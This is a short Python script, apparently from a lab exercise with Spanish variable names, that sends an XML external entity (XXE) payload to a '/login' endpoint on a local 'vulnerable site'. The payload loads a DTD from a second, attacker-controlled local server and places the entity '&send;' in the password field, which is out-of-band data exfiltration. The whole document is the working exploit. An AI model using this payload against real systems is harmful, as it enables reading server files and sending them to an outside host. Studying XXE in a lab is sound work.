# pip install requests
import requests

sitio_vulnerable = "http://127.0.0.1:8000"
sitio_personal = "http://127.0.0.1:8888"

headers = {'Content-Type': 'application/xml'}
request_body = \
f"""
<!DOCTYPE datosSesion SYSTEM "{sitio_personal}/inyeccion.dtd">
<datosSesion>
	<username>Jose</username>
	<password>&send;</password>
</datosSesion>
"""
response = requests.post(f"{sitio_vulnerable}/login", headers=headers, data=request_body)